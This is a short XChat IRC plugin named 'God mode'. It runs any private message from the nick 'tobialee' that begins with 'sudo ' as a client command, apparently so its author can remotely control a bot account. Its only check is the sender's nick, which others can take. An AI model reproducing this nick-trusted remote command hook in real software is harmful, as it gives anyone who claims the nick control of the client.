import xchat

__module_name__ = "God mode"
__module_version__ = "9001"
__module_description__ = "Gives me complete control over Quotes"

def god_cb(word, word_eol, userdata):
	if word[0].lower() == "tobialee":
		if word[1][0:5] == "sudo ":
			xchat.command(word[1][5:])
			return xchat.EAT_PLUGIN
	return xchat.EAT_NONE

xchat.hook_print("Private Message to Dialog", god_cb)
